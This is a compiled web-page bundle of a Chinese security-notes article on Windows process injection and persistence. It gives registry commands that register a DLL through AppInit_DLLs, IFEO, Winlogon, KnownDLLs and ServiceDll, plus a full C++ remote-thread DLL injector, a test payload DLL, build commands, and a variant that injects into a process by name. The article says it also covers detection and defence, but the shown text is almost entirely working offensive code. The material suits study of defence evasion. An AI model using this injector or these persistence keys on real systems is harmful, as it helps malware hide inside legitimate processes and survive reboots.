import{_ as s}from"./plugin-vue_export-helper-DlAUqK2U.js";import{c as a,b as t,o as p}from"./app-BDHo8HdU.js";const o={};function e(c,n){return p(),a("div",null,[...n[0]||(n[0]=[t(`<h1 id="进程注入方法整理" tabindex="-1"><a class="header-anchor" href="#进程注入方法整理"><span>进程注入方法整理</span></a></h1><p>本文的主题主要围绕各种进程注入技术进行原理讨论，并从防守方思考对应的检测和防御手段。</p><p>进程注入是一种在独立的活动进程的地址空间中执行任意代码的方法，在另一个进程的上下文中运行代码，会允许访问该进程的内存、系统资源、网络资源以及可能的特权提升。由于执行的代码由合法的程序代理执行，因此通过进程注入执行也可能会绕过部分安全产品的防病毒检测或进程白名单检测。</p><p>进程注入是一种广泛使用的躲避检测的技术，通常用于恶意软件或者无文件技术。其需要在另一个进程的地址空间内运行特制代码，进程注入改善了不可见性，同时一些技术也实现了持久性。大体上，进程注入可以分为两种形式：DLL 注入、Shellcode 注入。这两种方式没有本质上的区别，在操作系统层面，dll 也是 shellcode 汇编代码。为了开发方便，白帽子常常会将代码以 dll 的形式编译并传播，在实际注入的时候，由注入方或者被注入方调用 loadlibrary 加载。</p><h2 id="_1-通过修改注册表实现注入和持久性" tabindex="-1"><a class="header-anchor" href="#_1-通过修改注册表实现注入和持久性"><span>1 通过修改注册表实现注入和持久性</span></a></h2><p>以下是针对上述常见 DLL 注入相关注册表项的 <code>cmd</code> 命令示例（以 <code>C:\\MyDlls\\inject.dll</code> 为例，部分需要管理员权限）：</p><p><strong>1. AppInit_DLLs</strong></p><pre><code class="language-cmd">reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows&quot; /v AppInit_DLLs /t REG_SZ /d &quot;C:\\MyDlls\\inject.dll&quot; /f
reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows&quot; /v LoadAppInit_DLLs /t REG_DWORD /d 1 /f
</code></pre><p><strong>2. IFEO Debugger</strong></p><pre><code class="language-cmd">reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\\MyDlls\\inject.dll&quot; /f
</code></pre><blockquote><p>注：通常 Debugger 应为可执行文件路径，DLL 注入需配合自定义 loader。</p></blockquote><p><strong>3. Shell 扩展（以 ContextMenuHandlers 为例）</strong></p><pre><code>reg add &quot;HKCR\\*\\shellex\\ContextMenuHandlers\\MyInject&quot; /ve /t REG_SZ /d &quot;{CLSID}&quot; /f
</code></pre><blockquote><p>需先注册 DLL 并获取 CLSID。</p></blockquote><p><strong>4. Winlogon Notify</strong></p><pre><code>reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\Notify\\MyInject&quot; /v DLLName /t REG_SZ /d &quot;C:\\MyDlls\\inject.dll&quot; /f
</code></pre><p><strong>5. KnownDLLs</strong></p><pre><code>reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs&quot; /v inject /t REG_SZ /d &quot;inject.dll&quot; /f
</code></pre><blockquote><p>需将 DLL 放入 System32 目录，且此项修改有系统风险。</p></blockquote><p><strong>6. Explorer ShellExecuteHooks</strong></p><pre><code>reg add &quot;HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ShellExecuteHooks&quot; /v {CLSID} /t REG_SZ /d &quot;&quot; /f
</code></pre><blockquote><p>需先注册 DLL 并获取 CLSID。</p></blockquote><p><strong>7. 服务 ServiceDll</strong></p><pre><code>reg add &quot;HKLM\\SYSTEM\\CurrentControlSet\\Services\\MyService\\Parameters&quot; /v ServiceDll /t REG_SZ /d &quot;C:\\MyDlls\\inject.dll&quot; /f
</code></pre><p><strong>注意事项：</strong></p><ul><li>修改注册表有风险，操作前请备份注册表。</li><li>某些项（如 KnownDLLs、Winlogon）对系统影响极大，慎用。</li><li>某些注册表项需配合 DLL 注册（如 Shell 扩展、ShellExecuteHooks）。</li><li>需以管理员权限运行命令提示符。</li></ul><h2 id="_2-远程线程注入-remote-thread-injection" tabindex="-1"><a class="header-anchor" href="#_2-远程线程注入-remote-thread-injection"><span>2 远程线程注入（Remote Thread Injection）</span></a></h2><p>通过远程线程注入（Remote Thread Injection）方式向指定进程注入 DLL。主要流程如下：</p><ol><li>参数解析：接收目标进程 ID 和 DLL 路径。</li><li>打开目标进程：使用 OpenProcess 获取进程句柄。</li><li>分配内存：用 VirtualAllocEx 在目标进程中分配一块内存，用于存放 DLL 路径。</li><li>写入 DLL 路径：用 WriteProcessMemory 将 DLL 路径写入目标进程的内存。</li><li>获取 LoadLibraryA 地址：通过 GetProcAddress 获取 Kernel32.dll 中 LoadLibraryA 的地址。</li><li>创建远程线程：用 CreateRemoteThread 在目标进程中创建线程，线程入口为 LoadLibraryA，参数为 DLL 路径，实现 DLL 注入。</li><li>等待线程结束：用 WaitForSingleObject 等待远程线程执行完毕。</li><li>资源清理：释放分配的内存，关闭句柄</li></ol><pre><code class="language-cpp"><span class="token comment">// RemoteThreadInjector1.cpp</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream&gt;</span></span>

<span class="token comment">// DWORD: 32位无符号整型，typedef unsigned long DWORD;</span>
<span class="token comment">// HANDLE: Windows对象句柄，typedef void* HANDLE;</span>
<span class="token comment">// LPVOID: 通用指针类型，typedef void* LPVOID;</span>
<span class="token comment">// LPTHREAD_START_ROUTINE: 线程函数指针类型，typedef DWORD (WINAPI *LPTHREAD_START_ROUTINE)(LPVOID);</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">SetConsoleOutputCP</span><span class="token punctuation">(</span>CP_UTF8<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">&quot;用法: &quot;</span> <span class="token operator">&lt;&lt;</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">&quot; &lt;进程ID&gt; &lt;DLL路径&gt;&quot;</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    DWORD pid <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token function">stoul</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>dllPath <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token comment">// 打开目标进程</span>
    HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> pid<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hProcess<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        std<span class="token double-colon punctuation">::</span>cerr <span class="token operator">&lt;&lt;</span> <span class="token string">&quot;无法打开进程: &quot;</span> <span class="token operator">&lt;&lt;</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 在目标进程中分配内存</span>
    LPVOID pRemoteBuf <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>dllPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span>
                                       MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pRemoteBuf<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        std<span class="token double-colon punctuation">::</span>cerr <span class="token operator">&lt;&lt;</span> <span class="token string">&quot;VirtualAllocEx 失败: &quot;</span> <span class="token operator">&lt;&lt;</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
        <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 写入 DLL 路径到目标进程</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pRemoteBuf<span class="token punctuation">,</span> dllPath<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>dllPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        std<span class="token double-colon punctuation">::</span>cerr <span class="token operator">&lt;&lt;</span> <span class="token string">&quot;WriteProcessMemory 失败: &quot;</span> <span class="token operator">&lt;&lt;</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
        <span class="token function">VirtualFreeEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pRemoteBuf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 获取 LoadLibraryA 地址</span>
    LPTHREAD_START_ROUTINE pfnThreadRtn <span class="token operator">=</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>
        <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">&quot;Kernel32&quot;</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">&quot;LoadLibraryA&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>pfnThreadRtn<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        std<span class="token double-colon punctuation">::</span>cerr <span class="token operator">&lt;&lt;</span> <span class="token string">&quot;GetProcAddress 失败: &quot;</span> <span class="token operator">&lt;&lt;</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
        <span class="token function">VirtualFreeEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pRemoteBuf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 创建远程线程</span>
    HANDLE hThread <span class="token operator">=</span> <span class="token function">CreateRemoteThread</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> pfnThreadRtn<span class="token punctuation">,</span>
                                        pRemoteBuf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>hThread<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        std<span class="token double-colon punctuation">::</span>cerr <span class="token operator">&lt;&lt;</span> <span class="token string">&quot;CreateRemoteThread 失败: &quot;</span> <span class="token operator">&lt;&lt;</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
        <span class="token function">VirtualFreeEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pRemoteBuf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 等待线程结束</span>
    <span class="token function">WaitForSingleObject</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span> INFINITE<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 清理</span>
    <span class="token function">VirtualFreeEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pRemoteBuf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>

    std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">&quot;DLL 注入成功！&quot;</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><p>注入的 DLL 文件需要满足以下条件：</p><ol><li>必须是标准的 Windows 动态链接库（.dll），并且导出 DllMain 函数。</li><li>DllMain 函数签名必须为：</li></ol><pre><code class="language-cpp">BOOL APIENTRY <span class="token function">DllMain</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span> DWORD ul_reason_for_call<span class="token punctuation">,</span> LPVOID lpReserved<span class="token punctuation">)</span>
</code></pre><ol start="3"><li>不能有依赖用户输入或复杂初始化的全局对象，避免注入时出错。</li><li>代码应尽量简洁，避免在 DllMain 中执行耗时或阻塞操作（如长时间等待、死循环等）。</li><li>如果需要与目标进程交互，需确保兼容性和稳定性，避免崩溃目标进程。</li><li>编译时目标平台（x86/x64）需与目标进程一致。</li></ol><p>简单来说，注入的 DLL 只需有合法的 DllMain，并且在 <code>DLL_PROCESS_ATTACH</code> 分支实现你的功能即可。</p><pre><code class="language-cpp"><span class="token comment">// InjectedDll.cpp</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h&gt;</span></span>

BOOL APIENTRY <span class="token function">DllMain</span><span class="token punctuation">(</span>HMODULE hModule<span class="token punctuation">,</span>
                      DWORD ul_reason_for_call<span class="token punctuation">,</span>
                      LPVOID lpReserved<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token keyword">switch</span> <span class="token punctuation">(</span>ul_reason_for_call<span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
    <span class="token keyword">case</span> DLL_PROCESS_ATTACH<span class="token operator">:</span>
        <span class="token comment">// 测试DLL是否被执行</span>
        <span class="token comment">// MessageBoxW(NULL, L&quot;DLL已被注入并执行&quot;, L&quot;注入测试&quot;, MB_OK);</span>
        <span class="token function">WinExec</span><span class="token punctuation">(</span><span class="token string">&quot;calc.exe&quot;</span><span class="token punctuation">,</span> SW_SHOW<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token keyword">case</span> DLL_THREAD_ATTACH<span class="token operator">:</span>
    <span class="token keyword">case</span> DLL_THREAD_DETACH<span class="token operator">:</span>
    <span class="token keyword">case</span> DLL_PROCESS_DETACH<span class="token operator">:</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

</code></pre><p>编译命令</p><pre><code class="language-powershell">g+<span class="token operator">+</span> <span class="token operator">-</span>shared <span class="token operator">-</span>o InjectedDll<span class="token punctuation">.</span>dll InjectedDll<span class="token punctuation">.</span><span class="token function">cpp</span>
g+<span class="token operator">+</span> RemoteThreadInjector1<span class="token punctuation">.</span><span class="token function">cpp</span> <span class="token operator">-</span>o RemoteThreadInjector1
</code></pre><p>注入命令</p><pre><code class="language-powershell"><span class="token punctuation">.</span>\\RemoteThreadInjector1 35108 InjectedDll<span class="token punctuation">.</span>dll路径
</code></pre><p>除了直接指定目标进程 ID，还可以指定进程名</p><pre><code class="language-cpp"><span class="token comment">// 获取指定进程名的第一个进程ID</span>
DWORD <span class="token function">GetProcessIdByName</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>processName<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    DWORD processId <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
    PROCESSENTRY32 pe32<span class="token punctuation">;</span>
    pe32<span class="token punctuation">.</span>dwSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>PROCESSENTRY32<span class="token punctuation">)</span><span class="token punctuation">;</span>
    HANDLE hProcessSnap <span class="token operator">=</span> <span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span>TH32CS_SNAPPROCESS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>hProcessSnap <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">Process32First</span><span class="token punctuation">(</span>hProcessSnap<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pe32<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">do</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>pe32<span class="token punctuation">.</span>szExeFile<span class="token punctuation">,</span> processName<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                processId <span class="token operator">=</span> pe32<span class="token punctuation">.</span>th32ProcessID<span class="token punctuation">;</span>
                <span class="token keyword">break</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">Process32Next</span><span class="token punctuation">(</span>hProcessSnap<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pe32<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcessSnap<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> processId<span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">SetConsoleOutputCP</span><span class="token punctuation">(</span>CP_UTF8<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 检查参数数量</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        std<span class="token double-colon punctuation">::</span>cout <span class="token operator">&lt;&lt;</span> <span class="token string">&quot;用法: &quot;</span> <span class="token operator">&lt;&lt;</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">&quot; &lt;进程名.exe&gt; &lt;DLL路径&gt;&quot;</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">// 获取目标进程ID</span>
    DWORD pid <span class="token operator">=</span> <span class="token function">GetProcessIdByName</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        std<span class="token double-colon punctuation">::</span>cerr <span class="token operator">&lt;&lt;</span> <span class="token string">&quot;未找到指定进程: &quot;</span> <span class="token operator">&lt;&lt;</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> std<span class="token double-colon punctuation">::</span>endl<span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>


</code></pre><p>注入命令</p><pre><code class="language-powershell"><span class="token punctuation">.</span>\\RemoteThreadInjector2 Obsidian<span class="token punctuation">.</span>exe InjectedDll<span class="token punctuation">.</span>dll路径
</code></pre>`,44)])])}const r=s(o,[["render",e]]),k=JSON.parse('{"path":"/CyberSecurity/DefenseEvasion/ProcessInjection.html","title":"进程注入方法整理","lang":"zh-CN","frontmatter":{"article":true,"tags":["持久化","防御规避"],"description":"进程注入方法整理 本文的主题主要围绕各种进程注入技术进行原理讨论，并从防守方思考对应的检测和防御手段。 进程注入是一种在独立的活动进程的地址空间中执行任意代码的方法，在另一个进程的上下文中运行代码，会允许访问该进程的内存、系统资源、网络资源以及可能的特权提升。由于执行的代码由合法的程序代理执行，因此通过进程注入执行也可能会绕过部分安全产品的防病毒检测或...","head":[["meta",{"property":"og:url","content":"https://echo0d.github.io/DailyNotes/CyberSecurity/DefenseEvasion/ProcessInjection.html"}],["meta",{"property":"og:site_name","content":"echo0d-notes"}],["meta",{"property":"og:title","content":"进程注入方法整理"}],["meta",{"property":"og:description","content":"进程注入方法整理 本文的主题主要围绕各种进程注入技术进行原理讨论，并从防守方思考对应的检测和防御手段。 进程注入是一种在独立的活动进程的地址空间中执行任意代码的方法，在另一个进程的上下文中运行代码，会允许访问该进程的内存、系统资源、网络资源以及可能的特权提升。由于执行的代码由合法的程序代理执行，因此通过进程注入执行也可能会绕过部分安全产品的防病毒检测或..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-06-04T09:27:16.000Z"}],["meta",{"property":"article:author","content":"echo0d"}],["meta",{"property":"article:tag","content":"持久化"}],["meta",{"property":"article:tag","content":"防御规避"}],["meta",{"property":"article:modified_time","content":"2025-06-04T09:27:16.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"进程注入方法整理\\",\\"image\\":[\\"\\"],\\"dateModified\\":\\"2025-06-04T09:27:16.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"echo0d\\",\\"url\\":\\"\\"}]}"]]},"headers":[{"level":2,"title":"1 通过修改注册表实现注入和持久性","slug":"_1-通过修改注册表实现注入和持久性","link":"#_1-通过修改注册表实现注入和持久性","children":[]},{"level":2,"title":"2 远程线程注入（Remote Thread Injection）","slug":"_2-远程线程注入-remote-thread-injection","link":"#_2-远程线程注入-remote-thread-injection","children":[]}],"git":{"createdTime":1737700237000,"updatedTime":1749029236000,"contributors":[{"name":"echo0d","email":"echo0d@163.com","commits":4}]},"readingTime":{"minutes":5.45,"words":1634},"filePathRelative":"CyberSecurity/DefenseEvasion/ProcessInjection.md","localizedDate":"2025年1月24日","excerpt":"\\n<p>本文的主题主要围绕各种进程注入技术进行原理讨论，并从防守方思考对应的检测和防御手段。</p>\\n","autoDesc":true}');export{r as comp,k as data};
